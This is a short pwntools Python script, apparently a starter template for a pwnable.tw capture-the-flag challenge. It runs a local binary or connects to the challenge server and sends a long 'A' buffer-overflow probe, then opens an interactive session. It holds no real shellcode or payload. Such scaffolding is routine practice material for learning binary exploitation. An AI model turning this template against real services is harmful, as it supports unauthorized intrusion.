from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
context.log_level = 'DEBUG'
DEBUG = 1
file = './chall'
exe  = ELF(file)

if DEBUG:
    libc = ELF('libc.so.6')
    #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
    #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
    io = process(file)
    input(text)
else:
    libc = ELF('./libc.so.6')
    io = remote('chall.pwnable.tw', 1337)


def main():
    # declared
    # exploit
    payload = (0x1000-1)*b'A'
    io.sendline(payload)

if __name__ == '__main__':
    main()
    io.interactive()